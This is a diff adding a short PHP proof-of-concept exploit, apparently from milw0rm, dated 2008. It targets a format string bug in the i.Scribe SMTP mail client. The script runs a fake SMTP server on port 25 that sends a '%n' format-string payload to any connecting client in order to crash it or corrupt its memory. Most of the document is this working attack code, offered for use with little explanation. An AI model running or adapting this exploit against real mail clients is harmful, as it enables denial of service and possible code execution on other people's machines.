@@ -1,0 +1,37 @@
+<?php 
+//I dont have c lol
+/*___=++++++++++++__=--=________*****
+ 0-- 
+  --  i.Scribe smtp client v 1.88 to 2.00 beta
+      Format String (wscanf) bug p0c
+      vendor : Memecode Software 
+      grTs;SiD.psycho 
+      A.Luja 27.11.08  
+
+--)(________++++++++++++++++++++---*** 
+
+___00)_- NOTE!!! you must enabled extension=php_sockets.dll in php.ini ___==
+          Or just open nc -l -p 25 lol*/
+$host= $_SERVER[SERVER_ADDR];
+$port= 25;
+$ret = "AAAA%n%n%n%n%n%n%n%n%n";
+$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die ("socket error\n"); 
+$bind = socket_bind ($socket, $host, $port) or die ("bind error\n"); 
+$listen = socket_listen($socket,1) or die("listen error\n");
+printf("--==Fake smtp server ready==----\n");
+printf("Now connect here witch iScribe client\n");
+if(($acp=socket_accept($socket))!==false){
+    printf("Target connected\n");
+    sleep(2);
+    printf("send evil char\n");
+    $hello=socket_write($acp,$ret,strlen($ret));  
+    printf("done\n");
+    socket_close($acp);
+}
+socket_close($socket);
+exit();
+?>
+
+//Alfons Luja
+
+# milw0rm.com [2008-11-27]
